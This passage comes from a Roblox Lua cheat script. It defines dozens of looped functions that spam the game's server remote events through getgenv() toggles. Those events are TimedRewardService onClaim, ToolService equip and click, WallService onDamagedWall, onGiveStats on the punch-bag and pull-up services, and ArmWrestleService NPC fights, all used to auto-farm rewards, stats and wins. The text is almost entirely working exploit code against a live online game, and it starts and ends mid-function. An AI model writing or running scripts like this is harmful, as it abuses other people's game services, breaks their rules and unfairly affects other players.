    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim5()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "5"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim6()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "6"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim7()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "7"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim8()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "8"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim9()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "9"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim10()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "10"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim11()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "11"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end
   
function doClaim12()
    spawn(function()
    while getgenv().autoClaim == true do
    local args = {
    [1] = "12"
    } 
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("TimedRewardService"):WaitForChild("RE"):WaitForChild("onClaim"):FireServer(unpack(args)) 
    wait(0.2)
    end
    end)
end

-- FARM FUNC

function doAtlb()
    spawn(function()
    while getgenv().autoBiceps == true do
    local args = {
    [1] = "AquaEvent",
    [2] = "Dumbells",
    [3] = "3750Kg"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onEquipRequest"):FireServer(unpack(args))
    task.wait()
    end
    end)
   end
   
function doAtlg()
    spawn(function()
    while getgenv().autoGrips == true do
    local args = {
    [1] = "AquaEvent",
    [2] = "Grips",
    [3] = "250Kg"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onEquipRequest"):FireServer(unpack(args)) 
    task.wait()
    end
    end)
end

function doBiceps2()
    spawn(function()
    while getgenv().autoBiceps == true do
    local args = {
    [1] = "2",
    [2] = "Dumbells",
    [3] = "4000Kg"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onEquipRequest"):FireServer(unpack(args))
    task.wait()
    end
    end)
end
   
function doBiceps3()
    spawn(function()
    while getgenv().autoBiceps == true do
    local args = {
    [1] = "3",
    [2] = "Dumbells",
    [3] = "45000Kg"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onEquipRequest"):FireServer(unpack(args))
    task.wait()
    end
    end)
end
   
function doBiceps4()
    spawn(function()
    while getgenv().autoBiceps == true do
    local args = {
    [1] = "4",
    [2] = "Dumbells",
    [3] = "300000Kg"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onEquipRequest"):FireServer(unpack(args))
    task.wait()
    end
    end)
end
   
function doBiceps5()
       spawn(function()
       while getgenv().autoBiceps == true do
           local args = {
               [1] = 4,
               [2] = "Barbells",
               [3] = "Tier12"
           }
           game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
           game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onEquipRequest"):FireServer(unpack(args))
           
       task.wait(2)
       end
       end)
end

function doGrips2()
        spawn(function()
        while getgenv().autoGrips == true do
        local args = {
        [1] = "2",
        [2] = "Grips",
        [3] = "1500Kg"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onEquipRequest"):FireServer(unpack(args)) 
        task.wait()
        end
        end)
end
       
function doGrips3()
        spawn(function()
        while getgenv().autoGrips == true do
        local args = {
        [1] = "3",
        [2] = "Grips",
        [3] = "45000Kg"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onEquipRequest"):FireServer(unpack(args)) 
        task.wait()
        end
        end)
end

       
function doGrips4()
        spawn(function()
        while getgenv().autoGrips == true do
        local args = {
        [1] = "4",
        [2] = "Grips",
        [3] = "300000Kg"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onEquipRequest"):FireServer(unpack(args)) 
        task.wait()
        end
        end)
end

function doGrips5()
    spawn(function()
    while getgenv().autoGrips == true do
    local args = {
    [1] = "5",
    [2] = "Grips",
    [3] = "625000Kg"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onEquipRequest"):FireServer(unpack(args)) 
    task.wait()
    end
    end)
end

function doBar()
    spawn(function()
    while getgenv().autoBar == true do
        local args = {
            [1] = "5",
            [2] = "Tier8"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("PullupBarService"):WaitForChild("RE"):WaitForChild("onGiveStats"):FireServer(unpack(args))         
    task.wait()
    end
    end)
end

function do1Wall()
    spawn(function()
    while getgenv().autoWall == true do
        local args = {
            [1] = "5",
            [2] = "Tier1",
            [3] = "1"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onUnequipRequest"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("WallService"):WaitForChild("RE"):WaitForChild("onDamagedWall"):FireServer(unpack(args)) 
    task.wait()
    end
    end)
end

function do2Wall()
    spawn(function()
    while getgenv().autoWall == true do
        local args = {
            [1] = "5",
            [2] = "Tier2",
            [3] = "1"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onUnequipRequest"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("WallService"):WaitForChild("RE"):WaitForChild("onDamagedWall"):FireServer(unpack(args)) 
    task.wait()
    end
    end)
end

function do3Wall()
    spawn(function()
    while getgenv().autoWall == true do
        local args = {
            [1] = "5",
            [2] = "Tier3",
            [3] = "1"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onUnequipRequest"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("WallService"):WaitForChild("RE"):WaitForChild("onDamagedWall"):FireServer(unpack(args)) 
    task.wait()
    end
    end)
end

function do4Wall()
    spawn(function()
    while getgenv().autoWall == true do
        local args = {
            [1] = "5",
            [2] = "Tier4",
            [3] = "1"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onUnequipRequest"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ToolService"):WaitForChild("RE"):WaitForChild("onClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("WallService"):WaitForChild("RE"):WaitForChild("onDamagedWall"):FireServer(unpack(args)) 
    task.wait()
    end
    end)
end

function doKnuckles2()
    spawn(function()
    while getgenv().autoKnuckles == true do
        local args = {
            [1] = "2",
            [2] = "Tier6"
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("PunchBagService"):WaitForChild("RE"):WaitForChild("onGiveStats"):FireServer(unpack(args))
         
    task.wait()
    end
    end)
end

function doKnuckles3()
    spawn(function()
    while getgenv().autoKnuckles == true do
        local args = {
            [1] = "3",
            [2] = "Tier6"
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("PunchBagService"):WaitForChild("RE"):WaitForChild("onGiveStats"):FireServer(unpack(args))
         
    task.wait()
    end
    end)
end

function doKnuckles4()
    spawn(function()
    while getgenv().autoKnuckles == true do
        local args = {
            [1] = "4",
            [2] = "Tier6"
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("PunchBagService"):WaitForChild("RE"):WaitForChild("onGiveStats"):FireServer(unpack(args))
         
    task.wait()
    end
    end)
end

-- FIGHT FUNC

function doFight9()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "RipperDoc",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("2"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("RipperDoc"),
    [3] = "2"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end
   
function doFight10()
    spawn(function()
    while getgenv().autoFight == true do
        local args = {
            [1] = "RogueAi",
            [2] = workspace:WaitForChild("Zones"):WaitForChild("2"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("RogueAi"),
            [3] = "2"
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doFightcoco()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "CocoNut",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("3"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("CocoNut"),
    [3] = "3"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doFight12()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "FatPirate",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("3"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("FatPirate"),
    [3] = "3"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end
   
function doFight13()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "MermaidKing",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("3"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("MermaidKing"),
    [3] = "3"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end
   
function doFight14()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "FriendlyShark",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("3"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("FriendlyShark"),
    [3] = "3"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end
   
function doFight15()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "KrakenBoss",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("3"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("KrakenBoss"),
    [3] = "3"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doFight16()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "Barbarian",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("4"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("Barbarian"),
    [3] = "4"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end
   
function doFight17()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "Hazmat",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("4"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("Hazmat"),
    [3] = "4"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end
   
function doFight18()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "Enforcer",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("4"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("Enforcer"),
    [3] = "4"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end
   
function doFight19()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "Bulk",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("4"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("Bulk"),
    [3] = "4"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doFight20()
    spawn(function()
    while getgenv().autoFight == true do
    local args = {
    [1] = "MutantKing",
    [2] = workspace:WaitForChild("Zones"):WaitForChild("4"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("MutantKing"),
    [3] = "4"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doFight21()
    spawn(function()
    while getgenv().autoFight == true do
        local args = {
            [1] = "Primal",
            [2] = workspace:WaitForChild("Zones"):WaitForChild("5"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("Primal"),
            [3] = "5"
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
        
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end

function doFight22()
    spawn(function()
    while getgenv().autoFight == true do
        local args = {
            [1] = "Dino",
            [2] = workspace:WaitForChild("Zones"):WaitForChild("5"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("Dino"),
            [3] = "5"
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onEnterNPCTable"):FireServer(unpack(args))
        
    game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("ArmWrestleService"):WaitForChild("RE"):WaitForChild("onClickRequest"):FireServer() 
    task.wait()
    end
    end)
end





function doFight23()
    spawn(function()
    while getgenv().autoFight == true do
        local args = {
            [1] = "Archeologist",
            [2] = workspace:WaitForChild("Zones"):WaitForChild("5"):WaitForChild("Interactables"):WaitForChild("ArmWrestling"):WaitForChild("NPC"):WaitForChild("Archeologist"),
            [3] = "5"
        }
        
